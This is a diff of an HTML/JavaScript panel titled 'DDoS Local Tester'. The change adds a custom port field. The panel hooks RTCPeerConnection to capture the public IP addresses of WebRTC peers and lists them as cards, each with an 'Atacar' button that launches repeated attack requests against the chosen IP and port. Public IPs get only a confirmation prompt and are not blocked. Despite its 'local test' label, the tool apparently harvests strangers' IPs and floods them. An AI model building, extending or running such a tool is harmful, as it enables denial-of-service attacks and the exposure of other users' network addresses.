@@ -3,10 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Local Tester - Entorno Controlado</title>
+    <title>DDoS Local Tester - Puerto personalizable</title>
 </head>
 <body>
-    <!-- El script se inyectará aquí al abrir el HTML -->
     <script>
         (function () {
             // --- Eliminar panel previo ---
@@ -14,12 +13,12 @@
             if (existingPanel) existingPanel.remove();
 
             // ============================================================
-            // 1. ESTILOS (igual que la versión final)
+            // 1. ESTILOS (con nuevo campo de puerto)
             // ============================================================
             const style = document.createElement('style');
             style.textContent = `
                 :root { --bg: #011522; --bg2: #0a1a2b; --bg3: #0d1f30; --border: #1a2a3a; --border2: #2a3a4a; --text: #e8e8ec; --text2: #8a8a96; --text3: #55555f; --green: #22c55e; --green-dim: rgba(34,197,94,.12); --yellow: #f59e0b; --yellow-dim: rgba(245,158,11,.10); --red: #ef4444; --red-dim: rgba(239,68,68,.10); --radius: 8px; }
-                #ip-container { position: fixed; top: 20px; right: 20px; width: 420px; max-height: 640px; background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: 0 24px 64px rgba(0,0,0,.7); font-family: system-ui, sans-serif; font-size: 13px; color: var(--text); z-index: 2147483647; display: flex; flex-direction: column; overflow: hidden; }
+                #ip-container { position: fixed; top: 20px; right: 20px; width: 440px; max-height: 660px; background: var(--bg); border: 1px solid var(--border); border-radius: var(--radius); box-shadow: 0 24px 64px rgba(0,0,0,.7); font-family: system-ui, sans-serif; font-size: 13px; color: var(--text); z-index: 2147483647; display: flex; flex-direction: column; overflow: hidden; }
                 #drag-handle { display: flex; align-items: center; padding: 12px 14px; background: var(--bg); border-bottom: 1px solid var(--border); cursor: move; user-select: none; flex-shrink: 0; gap: 8px; }
                 .tools { display: flex; align-items: center; gap: 6px; }
                 .box { display: inline-block; width: 13px; height: 13px; border-radius: 50%; cursor: pointer; border: none; }
@@ -48,16 +47,18 @@
                 .ipc-copy { background: var(--bg3); border: 1px solid var(--border2); border-radius: 7px; padding: 4px 12px; font-size: 11px; color: var(--text2); cursor: pointer; }
                 .ipc-copy:hover { background: var(--text); color: var(--bg); }
                 .ipc-status { font-size: 10px; color: var(--text3); flex: 1; }
-                .manual-add-bar { display: flex; gap: 6px; padding: 8px 10px; background: var(--bg3); border-bottom: 1px solid var(--border); flex-shrink: 0; }
-                .manual-add-bar input { flex: 1; background: var(--bg); border: 1px solid var(--border2); color: var(--text); border-radius: 4px; padding: 4px 8px; font-size: 12px; font-family: monospace; outline: none; }
+                .manual-add-bar { display: flex; gap: 6px; padding: 8px 10px; background: var(--bg3); border-bottom: 1px solid var(--border); flex-shrink: 0; flex-wrap: wrap; }
+                .manual-add-bar input { flex: 1; min-width: 80px; background: var(--bg); border: 1px solid var(--border2); color: var(--text); border-radius: 4px; padding: 4px 8px; font-size: 12px; font-family: monospace; outline: none; }
                 .manual-add-bar input:focus { border-color: var(--green); }
+                .manual-add-bar .port-input { flex: 0.5; min-width: 60px; }
                 .manual-add-bar button { background: var(--green); color: #000; border: none; border-radius: 4px; padding: 4px 12px; font-weight: 700; font-size: 12px; cursor: pointer; transition: .2s; white-space: nowrap; }
                 .manual-add-bar button:hover { opacity: .8; transform: scale(1.02); }
+                .manual-add-bar label { color: var(--text2); font-size: 12px; display: flex; align-items: center; gap: 4px; }
             `;
             document.head.appendChild(style);
 
             // ============================================================
-            // 2. ESTRUCTURA DEL PANEL
+            // 2. ESTRUCTURA DEL PANEL (con input de puerto)
             // ============================================================
             const panel = document.createElement('div');
             panel.id = 'ip-container';
@@ -72,11 +73,12 @@
                     <span id="ipc-count">0 IP</span>
                 </div>
                 <div class="manual-add-bar">
-                    <input type="text" id="manual-ip-input" placeholder="Ej: 127.0.0.1 (o IP local)" value="127.0.0.1">
+                    <input type="text" id="manual-ip-input" placeholder="IP (ej: 127.0.0.1)" value="127.0.0.1">
+                    <input type="number" id="manual-port-input" class="port-input" placeholder="Puerto" value="6346" min="1" max="65535">
                     <button id="manual-ip-btn">➕ Agregar</button>
                 </div>
                 <div id="ip-addresses">
-                    <div style="text-align:center;padding:40px;color:#555;">🔄 Agrega una IP manual o espera detección WebRTC</div>
+                    <div style="text-align:center;padding:40px;color:#555;">🔄 Agrega IP:puerto o espera detección WebRTC</div>
                 </div>
             `;
             document.body.appendChild(panel);
@@ -91,7 +93,7 @@
                 if (window._attackIntervals) window._attackIntervals.forEach(clearInterval);
                 window._attackIntervals = [];
                 document.getElementById('ipc-count').textContent = '0 IP';
-                document.getElementById('ip-addresses').innerHTML = `<div style="text-align:center;padding:40px;color:#555;">🔄 Agrega una IP manual o espera detección WebRTC</div>`;
+                document.getElementById('ip-addresses').innerHTML = `<div style="text-align:center;padding:40px;color:#555;">🔄 Agrega IP:puerto o espera detección WebRTC</div>`;
             });
             document.getElementById('ipc-btn-minimize').addEventListener('click', () => {
                 panel.style.opacity = '0.15';
@@ -99,7 +101,7 @@
             });
 
             // ============================================================
-            // 3. LÓGICA DE ATAQUE
+            // 3. LÓGICA DE ATAQUE (usa el puerto de la tarjeta)
             // ============================================================
             const seenIPs = new Map();
             let attackIntervals = [];
@@ -108,10 +110,10 @@
                 return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.)/.test(ip);
             }
 
-            function iniciarAtaque(ipDetectada, btnElement) {
-                const PUERTO = 6346;
-                const TARGET_URL = `http://${ipDetectada}:${PUERTO}`;
+            function iniciarAtaque(ipDetectada, puerto, btnElement) {
+                const TARGET_URL = `http://${ipDetectada}:${puerto}`;
 
+                // Seguridad para IPs públicas
                 if (!esIPPrivada(ipDetectada)) {
                     const confirmar = confirm(
                         `⚠️ ¡ATENCIÓN! IP PÚBLICA: ${ipDetectada}\n\n` +
@@ -165,14 +167,15 @@
             }
 
             // ============================================================
-            // 4. CREACIÓN DE TARJETAS
+            // 4. CREACIÓN DE TARJETAS (con puerto)
             // ============================================================
-            function upsertCard(ip) {
+            function upsertCard(ip, puerto) {
                 const list = document.getElementById('ip-addresses');
                 const time = new Date().toLocaleTimeString();
+                const key = `${ip}:${puerto}`;
 
-                if (seenIPs.has(ip)) {
-                    const card = seenIPs.get(ip);
+                if (seenIPs.has(key)) {
+                    const card = seenIPs.get(key);
                     card.querySelector('.ipc-time').textContent = time;
                     list.prepend(card);
                     return;
@@ -198,17 +201,18 @@
                     </div>
                     <div class="ipc-tags">
                         <span class="ipc-tag ${tagClass}">${tagText}</span>
-                        <span class="ipc-tag">🎯 Puerto: 6346</span>
+                        <span class="ipc-tag">🎯 Puerto: ${puerto}</span>
                     </div>
                     <div class="ipc-card-footer">
-                        <span class="ipc-status" id="status-${ip.replace(/\./g,'-')}">✅ Listo</span>
+                        <span class="ipc-status" id="status-${ip.replace(/\./g,'-')}-${puerto}">✅ Listo</span>
                         <button class="ipc-copy">📋 Copiar</button>
                         <button class="btn-attack">🔥 Atacar</button>
                     </div>
                 `;
 
                 card.querySelector('.ipc-copy').addEventListener('click', () => {
-                    navigator.clipboard.writeText(ip).then(() => {
+                    const texto = `${ip}:${puerto}`;
+                    navigator.clipboard.writeText(texto).then(() => {
                         const btn = card.querySelector('.ipc-copy');
                         btn.textContent = '✅ Copiado';
                         setTimeout(() => btn.textContent = '📋 Copiar', 1500);
@@ -217,33 +221,44 @@
 
                 const attackBtn = card.querySelector('.btn-attack');
                 attackBtn.addEventListener('click', () => {
-                    iniciarAtaque(ip, attackBtn);
+                    iniciarAtaque(ip, puerto, attackBtn);
                 });
 
-                seenIPs.set(ip, card);
+                seenIPs.set(key, card);
                 list.prepend(card);
             }
 
             // ============================================================
-            // 5. AGREGADOR MANUAL
+            // 5. AGREGADOR MANUAL (toma IP y puerto de los inputs)
             // ============================================================
             document.getElementById('manual-ip-btn').addEventListener('click', () => {
-                const input = document.getElementById('manual-ip-input');
-                const ip = input.value.trim();
+                const ipInput = document.getElementById('manual-ip-input');
+                const portInput = document.getElementById('manual-port-input');
+                const ip = ipInput.value.trim();
+                const puerto = parseInt(portInput.value.trim());
+
                 if (!ip) return alert('Escribe una IP válida');
                 if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) {
                     return alert('Formato de IP inválido (ej: 192.168.1.10)');
                 }
-                upsertCard(ip);
-                input.value = '';
+                if (isNaN(puerto) || puerto < 1 || puerto > 65535) {
+                    return alert('Puerto inválido (1-65535)');
+                }
+
+                upsertCard(ip, puerto);
+                // Opcional: limpiar el campo IP, pero dejamos el puerto
+                ipInput.value = '';
             });
 
             document.getElementById('manual-ip-input').addEventListener('keydown', (e) => {
                 if (e.key === 'Enter') document.getElementById('manual-ip-btn').click();
             });
+            document.getElementById('manual-port-input').addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') document.getElementById('manual-ip-btn').click();
+            });
 
             // ============================================================
-            // 6. HOOK DE WEBRTC (Detección automática)
+            // 6. HOOK DE WEBRTC (Detección automática, usa el puerto actual)
             // ============================================================
             window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
 
@@ -259,7 +274,11 @@
                             const ip = parts[4] || '';
                             const type = parts[7] || '';
                             if ((type === 'srflx' || type === 'prflx') && ip) {
-                                upsertCard(ip);
+                                // Obtener el puerto actual del campo de entrada
+                                const portInput = document.getElementById('manual-port-input');
+                                let puerto = parseInt(portInput.value.trim());
+                                if (isNaN(puerto) || puerto < 1 || puerto > 65535) puerto = 6346; // fallback
+                                upsertCard(ip, puerto);
                             }
                         }
                     } catch (_) {}
@@ -269,8 +288,8 @@
             };
             window.RTCPeerConnection.prototype = window.oRTCPeerConnection.prototype;
 
-            console.log('✅ Panel cargado. Agrega manualmente 127.0.0.1 o espera detección.');
-            console.log('⚠️ Ataques dirigidos al puerto 6346 de la IP que elijas.');
+            console.log('✅ Panel cargado. Agrega IP y puerto manualmente o espera detección WebRTC.');
+            console.log('⚠️ El puerto se toma del campo "Puerto" al agregar o detectar.');
         })();
     </script>
 </body>
